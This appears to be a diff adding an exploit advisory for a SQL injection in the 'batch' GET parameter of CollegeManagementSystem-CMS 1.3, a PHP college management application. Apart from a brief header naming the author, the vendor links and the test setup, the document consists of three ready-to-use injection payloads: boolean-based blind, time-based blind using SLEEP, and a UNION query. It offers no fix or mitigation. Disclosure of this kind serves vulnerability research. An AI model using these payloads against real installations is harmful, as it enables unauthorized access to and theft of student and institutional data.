@@ -1,0 +1,27 @@
+# Exploit Title: CollegeManagementSystem-CMS 1.3 - 'batch' SQL Injection
+# Author: Cakes
+# Discovery Date: 2019-09-16
+# Vendor Homepage: https://github.com/SaloniKumari123/CollegeManagementSystem
+# Software Link: https://github.com/SaloniKumari123/CollegeManagementSystem/archive/master.zip
+# Tested Version: 1.3
+# Tested on OS: CentOS 7
+# CVE: N/A
+
+# Description:
+# Another College Management system coded in PHP, most input values accounted for and sanitized, except this one :-)
+
+# Parameter: batch (GET)
+# Type: boolean-based blind
+# Title: OR boolean-based blind - WHERE or HAVING clause
+
+Payload: batch=-9643' OR 9247=9247-- aqgq
+
+# Type: time-based blind
+# Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+
+Payload: batch=2021' AND (SELECT 6451 FROM (SELECT(SLEEP(5)))CWMt)-- zEfe
+
+# Type: UNION query
+# Title: Generic UNION query (NULL) - 3 columns
+
+Payload: batch=2021' UNION ALL SELECT NULL,CONCAT(0x71786a6271,0x564f6e51546c6f634741454d714e5777716d427361504d7a794b686c50657472724d616f49674b51,0x7171627171),NULL-- pPUb
